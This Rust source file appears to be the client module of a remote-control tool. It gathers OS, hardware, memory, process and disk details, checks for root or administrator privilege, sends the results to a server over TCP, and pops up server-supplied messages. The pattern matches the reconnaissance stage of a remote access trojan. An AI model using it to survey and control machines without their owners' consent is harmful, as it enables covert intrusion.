use rfd::MessageDialog;
use shared::{ClientMessage, DiskInformation, HardwareInformation, MemoryInformation, OsInformation, Privilege, ProcessInformation, SystemInformation, utils::send_message};
use std::net::TcpStream;

use sysinfo::{Disks, System};

// ---- sysInfo ---------------------------

fn get_system_information() -> SystemInformation {
    let mut sys = System::new();
    sys.refresh_all();

    let os_info = OsInformation {
        name: System::name(),
        hostname: System::host_name(),
        kernel_version: System::kernel_version(),
        os_version: System::os_version()
    };

    let hwd_info = HardwareInformation {
        cpu_brand: sys.cpus().first().map(|cpu| cpu.brand().to_string()).unwrap_or_else(|| "unknown".to_string()),
        cpu_count: sys.cpus().len()
    };

    let mem_info = MemoryInformation {
        total_ram: sys.total_memory(),
        used_ram: sys.used_memory(),
        total_swap: sys.total_swap(),
        used_swap: sys.used_swap(),
    };

    let processes: Vec<ProcessInformation> = sys
        .processes()
        .iter()
        .map(|(pid, process)| ProcessInformation {
            pid: pid.as_u32(),
            name: process.name().to_string_lossy().to_string(),
            cpu_usage: process.cpu_usage(),
            memory: process.memory(),
        })
        .collect();

    let disks_raw: Disks = Disks::new_with_refreshed_list();
    
    let disks:Vec<DiskInformation> = disks_raw
        .iter()
        .map(|disk| DiskInformation {
            name: disk.name().to_string_lossy().to_string(),
            file_system: disk.file_system().to_string_lossy().to_string(),
            total_space: disk.total_space(),
            available_space: disk.available_space(),
            is_removable: disk.is_removable(),
            is_read_only: disk.is_read_only(),
            device_path: disk.mount_point().to_string_lossy().to_string(),
        }).collect();


    SystemInformation { os: os_info, hardware: hwd_info, memory: mem_info, processes, disks }
}   

pub fn sysinfo(conn: &mut TcpStream) -> Result<bool, String> {
    let info: SystemInformation = get_system_information();

    let msg = ClientMessage::SystemInformation(info);
    match send_message(conn, &msg) {
        Ok(_) => Ok(true),
        Err(e) => return Err(e.to_string()) // ive should handle this better, the server can get stuck waiting for a msg
    }
}
// ---- sysInfo ---------------------------


// ---- checkPrivileges ---------------------------
#[cfg(unix)]
pub fn is_admin() -> bool {
    unsafe { libc::geteuid() == 0 }
}

#[cfg(windows)]
pub fn is_admin() -> bool {
    is_elevated::is_elevated()
}

pub fn check_privileges(conn: &mut TcpStream) -> Result<bool, String> {
    let msg = match is_admin() {
        true => Privilege::Admin,
        false => Privilege::User,
    };

    match send_message(conn, &msg) {
        Ok(_) => Ok(true),
        Err(e) => return Err(e.to_string()) // ive should handle this better, the server can get stuck waiting for a msg
    }
}

// ---- checkPrivileges ---------------------------


// ---- Display ---------------------------

pub fn display_message(instruct: &[&str]) -> Result<bool, String> {
    let msg = match instruct.get(1..instruct.len()) {
        Some(msg) => msg.join(" "),
        None => { return Ok(true) }
    };

    MessageDialog::new()
        .set_level(rfd::MessageLevel::Info)
        .set_title("")
        .set_description(msg)
        .show();

    Ok(true)
}

// ---- Display ---------------------------